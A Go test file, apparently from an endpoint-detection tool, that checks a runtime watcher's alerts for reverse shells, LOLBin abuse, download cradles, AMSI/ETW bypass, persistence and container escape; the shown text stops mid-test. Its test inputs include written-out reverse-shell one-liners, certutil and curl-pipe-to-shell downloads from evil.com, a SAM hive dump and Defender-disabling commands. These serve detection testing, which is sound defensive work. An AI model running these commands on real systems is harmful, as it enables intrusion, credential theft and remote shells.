package runtime

import (
	"context"
	"sync"
	"testing"
	"time"

	"github.com/1sec-project/1sec/internal/core"
	"github.com/rs/zerolog"
)

// ─── Helpers ─────────────────────────────────────────────────────────────────

type capturingPipeline struct {
	pipeline *core.AlertPipeline
	mu       sync.Mutex
	alerts   []*core.Alert
}

func makeCapturingPipeline() *capturingPipeline {
	cp := &capturingPipeline{}
	cp.pipeline = core.NewAlertPipeline(zerolog.Nop(), 10000)
	cp.pipeline.AddHandler(func(a *core.Alert) {
		cp.mu.Lock()
		cp.alerts = append(cp.alerts, a)
		cp.mu.Unlock()
	})
	return cp
}

func (cp *capturingPipeline) count() int {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	return len(cp.alerts)
}

func (cp *capturingPipeline) alertTitles() []string {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	titles := make([]string, len(cp.alerts))
	for i, a := range cp.alerts {
		titles[i] = a.Title
	}
	return titles
}

func (cp *capturingPipeline) hasAlertType(alertType string) bool {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	for _, alert := range cp.alerts {
		if alert.Type == alertType {
			return true
		}
	}
	return false
}

func startedModule(t *testing.T) *Watcher {
	t.Helper()
	w := New()
	cfg := core.DefaultConfig()
	if err := w.Start(context.Background(), nil, nil, cfg); err != nil {
		t.Fatalf("Watcher.Start() error: %v", err)
	}
	return w
}

func startedModuleWithPipeline(t *testing.T, cp *capturingPipeline) *Watcher {
	t.Helper()
	w := New()
	cfg := core.DefaultConfig()
	if err := w.Start(context.Background(), nil, cp.pipeline, cfg); err != nil {
		t.Fatalf("Watcher.Start() error: %v", err)
	}
	return w
}

// ─── Module Interface ─────────────────────────────────────────────────────────

func TestWatcher_Name(t *testing.T) {
	w := New()
	if w.Name() != ModuleName {
		t.Errorf("Name() = %q, want %q", w.Name(), ModuleName)
	}
}

func TestWatcher_Description(t *testing.T) {
	w := New()
	if w.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestWatcher_Start_Stop(t *testing.T) {
	w := New()
	cfg := core.DefaultConfig()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := w.Start(ctx, nil, nil, cfg); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	if w.fim == nil {
		t.Error("fim should be initialized")
	}
	if w.procMon == nil {
		t.Error("procMon should be initialized")
	}
	if err := w.Stop(); err != nil {
		t.Fatalf("Stop() error: %v", err)
	}
}

// ─── isSensitivePath ──────────────────────────────────────────────────────────

func TestIsSensitivePath(t *testing.T) {
	sensitive := []string{
		"/etc/passwd", "/etc/shadow", "/etc/sudoers",
		"/etc/ssh/sshd_config", "/root/.ssh/authorized_keys",
		"C:\\Windows\\System32\\config\\SAM",
		"C:\\Windows\\System32\\config\\SYSTEM",
		"/boot/grub/grub.cfg",
	}
	for _, p := range sensitive {
		if !isSensitivePath(p) {
			t.Errorf("expected %q to be sensitive", p)
		}
	}

	notSensitive := []string{
		"/tmp/data.txt", "/home/user/docs/report.pdf",
		"C:\\Users\\user\\Desktop\\file.txt",
	}
	for _, p := range notSensitive {
		if isSensitivePath(p) {
			t.Errorf("expected %q to NOT be sensitive", p)
		}
	}
}

// ─── isSuspiciousFile ─────────────────────────────────────────────────────────

func TestIsSuspiciousFile(t *testing.T) {
	suspicious := []string{
		"/tmp/payload.exe", "/tmp/backdoor.dll", "/tmp/shell.sh",
		"/tmp/script.ps1", "/tmp/webshell.php", "/tmp/exploit.py",
		"/tmp/dropper.bat", "/tmp/loader.vbs", "/tmp/attack.hta",
	}
	for _, f := range suspicious {
		if !isSuspiciousFile(f) {
			t.Errorf("expected %q to be suspicious", f)
		}
	}

	notSuspicious := []string{
		"/tmp/data.txt", "/tmp/image.png", "/tmp/doc.pdf",
		"/tmp/config.yaml", "/tmp/data.json",
	}
	for _, f := range notSuspicious {
		if isSuspiciousFile(f) {
			t.Errorf("expected %q to NOT be suspicious", f)
		}
	}
}

// ─── ProcessMonitor ───────────────────────────────────────────────────────────

func TestProcessMonitor_IsSuspicious_KnownTools(t *testing.T) {
	pm := NewProcessMonitor()
	tools := []string{
		"mimikatz", "nmap", "nc", "netcat", "sqlmap",
		"msfconsole", "xmrig", "rubeus", "bloodhound",
		"cobaltstrike", "empire", "sliver", "chisel",
	}
	for _, tool := range tools {
		if !pm.IsSuspicious(tool, "", "") {
			t.Errorf("expected %q to be suspicious", tool)
		}
	}
}

func TestProcessMonitor_IsSuspicious_WebServerChild(t *testing.T) {
	pm := NewProcessMonitor()
	// bash spawned from apache2 is suspicious
	if !pm.IsSuspicious("bash", "", "apache2") {
		t.Error("bash from apache2 should be suspicious")
	}
	if !pm.IsSuspicious("python", "", "nginx") {
		t.Error("python from nginx should be suspicious")
	}
	if !pm.IsSuspicious("cmd", "", "java") {
		t.Error("cmd from java should be suspicious")
	}
}

func TestProcessMonitor_IsSuspicious_NormalProcess(t *testing.T) {
	pm := NewProcessMonitor()
	if pm.IsSuspicious("notepad", "", "explorer") {
		t.Error("notepad from explorer should not be suspicious")
	}
}

func TestProcessMonitor_IsReverseShell(t *testing.T) {
	pm := NewProcessMonitor()
	shells := []string{
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"nc -e /bin/sh 10.0.0.1 4444",
		"python -c 'import socket,subprocess,os;s=socket.socket()",
		"php -r '$sock=fsockopen(\"10.0.0.1\",4444)'",
		"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
		"openssl s_client -connect 10.0.0.1:4444",
	}
	for _, cmd := range shells {
		if !pm.IsReverseShell(cmd) {
			t.Errorf("expected reverse shell detection for: %s", cmd)
		}
	}

	notShells := []string{
		"ls -la", "cat /etc/hosts", "python3 app.py",
		"node server.js", "go build ./...",
	}
	for _, cmd := range notShells {
		if pm.IsReverseShell(cmd) {
			t.Errorf("expected NO reverse shell detection for: %s", cmd)
		}
	}
}

// ─── LOLBin Detection ─────────────────────────────────────────────────────────

func TestProcessMonitor_IsLOLBin(t *testing.T) {
	pm := NewProcessMonitor()
	tests := []struct {
		name, cmdLine string
		wantDetected  bool
		wantTechnique string
	}{
		{"certutil", "certutil -urlcache -split -f http://evil.com/payload.exe", true, "File download"},
		{"certutil.exe", "certutil.exe -decode encoded.txt payload.exe", true, "Base64 decode"},
		{"mshta", "mshta http://evil.com/payload.hta", true, "Remote HTA execution"},
		{"regsvr32", "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", true, "Squiblydoo attack"},
		{"rundll32", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"", true, "JavaScript execution"},
		{"bitsadmin", "bitsadmin /transfer job /download http://evil.com/payload.exe", true, "File download"},
		{"wmic", "wmic process call create \"cmd.exe /c evil.bat\"", true, "Remote process creation"},
		{"msbuild", "msbuild evil.csproj", true, "Inline task code execution"},
		{"schtasks", "schtasks /create /tn evil /tr cmd.exe", true, "Scheduled task persistence"},
		{"reg", "reg save HKLM\\SAM sam.hive", true, "Registry hive dump (credential theft)"},
		{"netsh", "netsh advfirewall set allprofiles state off", true, "Firewall modification"},
		// Not a LOLBin
		{"notepad", "notepad.exe file.txt", false, ""},
	}
	for _, tc := range tests {
		result := pm.IsLOLBin(tc.name, tc.cmdLine, "explorer")
		if tc.wantDetected && !result.Detected {
			t.Errorf("expected LOLBin detection for %s: %s", tc.name, tc.cmdLine)
		}
		if !tc.wantDetected && result.Detected {
			t.Errorf("unexpected LOLBin detection for %s: %s", tc.name, tc.cmdLine)
		}
		if tc.wantDetected && result.Technique != tc.wantTechnique {
			t.Errorf("LOLBin %s technique = %q, want %q", tc.name, result.Technique, tc.wantTechnique)
		}
	}
}

func TestProcessMonitor_IsLOLBin_ExeExtension(t *testing.T) {
	pm := NewProcessMonitor()
	result := pm.IsLOLBin("certutil.exe", "certutil.exe -urlcache -f http://evil.com/p.exe", "cmd")
	if !result.Detected {
		t.Error("LOLBin detection should work with .exe extension")
	}
}

// ─── FileIntegrityMonitor ─────────────────────────────────────────────────────

func TestFileIntegrityMonitor_EmptyPaths(t *testing.T) {
	fim := NewFileIntegrityMonitor([]string{}, 5*time.Minute)
	fim.BaselineScan()
	changes := fim.Scan()
	if len(changes) != 0 {
		t.Errorf("expected 0 changes for empty paths, got %d", len(changes))
	}
}

func TestFileIntegrityMonitor_NonexistentPath(t *testing.T) {
	fim := NewFileIntegrityMonitor([]string{"/nonexistent/path/that/does/not/exist"}, 5*time.Minute)
	fim.BaselineScan()
	changes := fim.Scan()
	// Should not panic, just return empty
	if len(changes) != 0 {
		t.Errorf("expected 0 changes for nonexistent path, got %d", len(changes))
	}
}

// ─── HandleEvent Integration ──────────────────────────────────────────────────

func TestWatcher_HandleEvent_SensitiveFile(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "file_modified", core.SeverityInfo, "file modified")
	ev.Details["path"] = "/etc/shadow"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Sensitive File Modified" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected 'Sensitive File Modified' alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_SuspiciousFile(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "file_created", core.SeverityInfo, "file created")
	ev.Details["path"] = "/tmp/backdoor.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Suspicious File Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected 'Suspicious File Detected' alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_LOLBin(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "process start")
	ev.Details["process_name"] = "certutil"
	ev.Details["command_line"] = "certutil -urlcache -split -f http://evil.com/payload.exe"
	ev.Details["parent_process"] = "cmd.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Living Off the Land Binary Abuse Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected LOLBin alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_ReverseShell(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "process start")
	ev.Details["process_name"] = "bash"
	ev.Details["command_line"] = "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
	ev.Details["parent_process"] = "apache2"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Reverse Shell Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected reverse shell alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_PrivilegeEscalation(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "privilege_change", core.SeverityInfo, "priv change")
	ev.Details["user"] = "attacker"
	ev.Details["action"] = "setuid"
	ev.Details["target"] = "/bin/bash"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Privilege Escalation Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected privilege escalation alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_ContainerEscape(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "container_event", core.SeverityInfo, "container event")
	ev.Details["action"] = "nsenter"
	ev.Details["container_id"] = "abc123def456"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Container Escape Attempt" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected container escape alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_MemoryInjection(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	techniques := []string{
		"process_hollowing", "dll_injection", "reflective_loading",
		"thread_hijacking", "apc_injection",
	}
	for _, tech := range techniques {
		ev := core.NewSecurityEvent("test", "memory_injection", core.SeverityInfo, "injection")
		ev.Details["technique"] = tech
		ev.Details["target_process"] = "svchost.exe"
		ev.Details["source_process"] = "evil.exe"
		ev.Details["target_pid"] = "1234"
		ev.SourceIP = "10.0.0.1"

		w.HandleEvent(ev)
	}

	if cp.count() < len(techniques) {
		t.Errorf("expected %d memory injection alerts, got %d", len(techniques), cp.count())
	}
}

func TestWatcher_HandleEvent_MaliciousPersistence(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "scheduled_task", core.SeverityInfo, "scheduled task")
	ev.Details["name"] = "EvilTask"
	ev.Details["command"] = "powershell -enc SGVsbG8gV29ybGQ="
	ev.Details["user"] = "SYSTEM"
	ev.Details["path"] = "C:\\Windows\\Tasks"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Malicious Persistence Mechanism Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected malicious persistence alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_NormalPersistence(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "scheduled_task", core.SeverityInfo, "scheduled task")
	ev.Details["name"] = "WindowsUpdate"
	ev.Details["command"] = "C:\\Windows\\System32\\usoclient.exe StartScan"
	ev.Details["user"] = "SYSTEM"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Persistence Mechanism Created" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected normal persistence alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_SecureBootBypassed(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "firmware_event", core.SeverityInfo, "firmware event")
	ev.Details["secure_boot"] = "disabled"
	ev.Details["component"] = "UEFI"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Secure Boot Disabled/Bypassed" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected secure boot alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_FirmwareTampering(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "firmware_event", core.SeverityInfo, "firmware event")
	ev.Details["hash"] = "abc123"
	ev.Details["expected_hash"] = "def456"
	ev.Details["component"] = "bootloader"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Firmware Tampering Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected firmware tampering alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_EncodedFileless(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "powershell_exec", core.SeverityInfo, "powershell")
	ev.Details["process_name"] = "powershell.exe"
	ev.Details["command_line"] = "powershell -enc SGVsbG8gV29ybGQ="
	ev.Details["parent_process"] = "cmd.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Encoded Fileless Execution Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected encoded fileless execution alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_DownloadCradle(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "powershell_exec", core.SeverityInfo, "powershell")
	ev.Details["process_name"] = "powershell.exe"
	ev.Details["command_line"] = "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
	ev.Details["parent_process"] = "explorer.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Fileless Download Cradle Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected download cradle alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_AMSIBypass(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "powershell_exec", core.SeverityInfo, "powershell")
	ev.Details["process_name"] = "powershell.exe"
	ev.Details["command_line"] = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
	ev.Details["parent_process"] = "cmd.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "AMSI Bypass Attempt Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected AMSI bypass alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_WMIExecution(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "wmi_exec", core.SeverityInfo, "wmi exec")
	ev.Details["process_name"] = "wmic.exe"
	ev.Details["command_line"] = "wmic process call create cmd.exe"
	ev.Details["parent_process"] = "explorer.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "WMI-Based Execution Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected WMI execution alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_UEFIModification(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "uefi_event", core.SeverityInfo, "uefi event")
	ev.Details["action"] = "uefi_var_write"
	ev.Details["component"] = "SecureBoot"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "UEFI Variable Modified" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected UEFI modification alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_BootConfigChange(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "firmware_event", core.SeverityInfo, "firmware event")
	ev.Details["action"] = "bootloader_change"
	ev.Details["component"] = "grub"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Boot Configuration Modified" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected boot config change alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_EmptyPath(t *testing.T) {
	w := startedModule(t)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "file_modified", core.SeverityInfo, "file modified")
	ev.Details["path"] = ""
	ev.SourceIP = "10.0.0.1"

	if err := w.HandleEvent(ev); err != nil {
		t.Fatalf("HandleEvent() should not error on empty path: %v", err)
	}
}

func TestWatcher_HandleEvent_ContainerEscape_AllIndicators(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	indicators := []string{
		"mount_host_fs", "nsenter", "privileged_exec",
		"host_pid_access", "host_network_access", "cap_sys_admin",
		"docker_socket_mount", "proc_mount", "sys_ptrace",
		"apparmor_disabled", "seccomp_disabled",
	}
	for _, ind := range indicators {
		ev := core.NewSecurityEvent("test", "container_event", core.SeverityInfo, "container")
		ev.Details["action"] = ind
		ev.Details["container_id"] = "test123"
		ev.SourceIP = "10.0.0.1"
		w.HandleEvent(ev)
	}

	if cp.count() < len(indicators) {
		t.Errorf("expected %d container escape alerts, got %d", len(indicators), cp.count())
	}
}

// ─── Helper functions ─────────────────────────────────────────────────────────

func TestWatcher_HandleEvent_ExecutionIntegrityMismatch(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_exec", core.SeverityInfo, "exec")
	ev.Details["process_name"] = "agent-tool"
	ev.Details["executable_path"] = "/tmp/agent-tool"
	ev.Details["expected_hash"] = "aaaaaaaaaaaaaaaa"
	ev.Details["executed_hash"] = "bbbbbbbbbbbbbbbb"
	ev.Details["command_line"] = "/tmp/agent-tool --run"

	w.HandleEvent(ev)

	if !cp.hasAlertType("exec_integrity_mismatch") {
		t.Fatalf("expected exec_integrity_mismatch alert, got titles: %v", cp.alertTitles())
	}
}

func TestWatcher_HandleEvent_ExecutionPathSwap(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_exec", core.SeverityInfo, "exec")
	ev.Details["process_name"] = "agent-tool"
	ev.Details["validated_path"] = "/opt/agents/bin/tool"
	ev.Details["executed_path"] = "/tmp/tool"
	ev.Details["command_line"] = "/tmp/tool"

	w.HandleEvent(ev)

	if !cp.hasAlertType("exec_path_swap") {
		t.Fatalf("expected exec_path_swap alert, got titles: %v", cp.alertTitles())
	}
}

func TestWatcher_HandleEvent_TransientExecPath(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_exec", core.SeverityInfo, "exec")
	ev.Details["process_name"] = "loader"
	ev.Details["executed_path"] = "memfd:agent-loader (deleted)"
	ev.Details["command_line"] = "/proc/self/fd/9"

	w.HandleEvent(ev)

	if !cp.hasAlertType("exec_transient_path") {
		t.Fatalf("expected exec_transient_path alert, got titles: %v", cp.alertTitles())
	}
}

func TestTruncate(t *testing.T) {
	if truncate("hello", 10) != "hello" {
		t.Error("short string should not be truncated")
	}
	if truncate("hello world", 5) != "hello..." {
		t.Errorf("truncate('hello world', 5) = %q, want 'hello...'", truncate("hello world", 5))
	}
}

func TestGetStringSliceSetting(t *testing.T) {
	settings := map[string]interface{}{
		"paths": []interface{}{"/etc", "/var"},
	}
	result := getStringSliceSetting(settings, "paths", nil)
	if len(result) != 2 {
		t.Errorf("expected 2 paths, got %d", len(result))
	}

	// Default value
	result = getStringSliceSetting(settings, "missing", []string{"/default"})
	if len(result) != 1 || result[0] != "/default" {
		t.Error("expected default value for missing key")
	}
}

// ─── Compile-time interface check ─────────────────────────────────────────────

var _ core.Module = (*Watcher)(nil)

// Suppress unused import
var _ = time.Now

// ─── Symlink / Link-Following Detection Tests ─────────────────────────────────

func TestWatcher_HandleEvent_SymlinkSensitivePath(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "mklink")
	ev.Details["process_name"] = "cmd.exe"
	ev.Details["command_line"] = `mklink /D C:\Windows\System32\config\link C:\temp\payload`
	ev.Details["parent_process"] = "explorer.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Symlink Attack on Sensitive Path Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected symlink sensitive path alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_SymlinkNonSensitive(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "mklink")
	ev.Details["process_name"] = "cmd.exe"
	ev.Details["command_line"] = `mklink /D C:\Users\dev\mylink C:\projects\src`
	ev.Details["parent_process"] = "explorer.exe"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Symlink Creation Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected symlink creation alert (non-sensitive), got: %v", titles)
	}
}

// ─── ETW Bypass Detection Tests ───────────────────────────────────────────────

func TestWatcher_HandleEvent_ETWBypass(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "fileless_execution", core.SeverityInfo, "etw bypass")
	ev.Details["process_name"] = "powershell.exe"
	ev.Details["command_line"] = "[Ref].Assembly.GetType('System.Diagnostics.Eventing.EtwEventWrite')"
	ev.Details["parent_process"] = "cmd.exe"
	ev.Details["script_content"] = ""
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "ETW/Logging Evasion Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected ETW bypass alert, got: %v", titles)
	}
}

func TestWatcher_HandleEvent_DefenderDisable(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "fileless_execution", core.SeverityInfo, "defender disable")
	ev.Details["process_name"] = "powershell.exe"
	ev.Details["command_line"] = "Set-MpPreference -DisableIOAVProtection $true"
	ev.Details["parent_process"] = "cmd.exe"
	ev.Details["script_content"] = ""
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "ETW/Logging Evasion Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected ETW bypass alert for Defender disable, got: %v", titles)
	}
}

// ─── Lua Shellcode Loader Detection Tests ─────────────────────────────────────

func TestWatcher_HandleEvent_LuaShellcodeLoader(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	ev := core.NewSecurityEvent("test", "fileless_execution", core.SeverityInfo, "lua loader")
	ev.Details["process_name"] = "luajit.exe"
	ev.Details["command_line"] = "luajit.exe payload.lua"
	ev.Details["parent_process"] = "powershell.exe"
	ev.Details["script_content"] = "local ffi = require('ffi'); ffi.cast('void(*)()', shellcode)()"
	ev.SourceIP = "10.0.0.1"

	w.HandleEvent(ev)

	titles := cp.alertTitles()
	found := false
	for _, title := range titles {
		if title == "Lua-Based Shellcode Loader Detected" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected Lua shellcode loader alert, got: %v", titles)
	}
}

// ─── isSensitiveCmdTarget Tests ───────────────────────────────────────────────

func TestClassifyRealtimeFileChange_FilelessLPE(t *testing.T) {
	finding := classifyRealtimeFileChange(FileChange{
		Path: "/dev/shm/cve-2026-overlayfs-setuid.sh",
		Type: "created",
	})
	if finding == nil {
		t.Fatal("expected real-time fileless LPE finding")
	}
	if finding.AlertType != "realtime_fileless_lpe" {
		t.Fatalf("AlertType = %q, want realtime_fileless_lpe", finding.AlertType)
	}
	if finding.Severity != core.SeverityCritical {
		t.Fatalf("Severity = %v, want critical", finding.Severity)
	}
}

func TestWatcher_EmitFileChange_RealtimeTransientExec(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)
	defer w.Stop()

	w.emitFileChange(FileChange{
		Path: "/tmp/payload.sh",
		Type: "close_write",
	}, "realtime")

	if !cp.hasAlertType("realtime_transient_exec") {
		t.Fatalf("expected realtime_transient_exec alert, got titles: %v", cp.alertTitles())
	}
}

func TestIsSensitiveCmdTarget(t *testing.T) {
	cases := []struct {
		input string
		want  bool
	}{
		{`mklink /d /etc/shadow c:\temp`, true},
		{`ln -s /root/.ssh/id_rsa /tmp/key`, true},
		{`mklink c:\windows\system32\config\sam c:\temp\sam`, true},
		{`ln -s .git/config /tmp/gitcfg`, true},
		{`mklink c:\users\dev\link c:\projects`, false},
		{`ln -s /tmp/a /tmp/b`, false},
	}
	for _, tc := range cases {
		got := isSensitiveCmdTarget(tc.input)
		if got != tc.want {
			t.Errorf("isSensitiveCmdTarget(%q) = %v, want %v", tc.input, got, tc.want)
		}
	}
}

// ─── yt-dlp RCE Detection (CVE-2026-26331) ──────────────────────────────────

func TestYtdlpRCE_DetectedOnNetrcCmd(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
	ev.Details["process_name"] = "yt-dlp"
	ev.Details["command_line"] = `yt-dlp --netrc-cmd "curl http://evil.com/shell | sh" https://youtube.com/watch?v=abc`
	ev.Details["parent_process"] = "python3"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	if cp.count() == 0 {
		t.Error("expected alert for yt-dlp --netrc-cmd RCE")
	}
}

func TestYtdlpRCE_DetectedOnExec(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
	ev.Details["process_name"] = "yt-dlp"
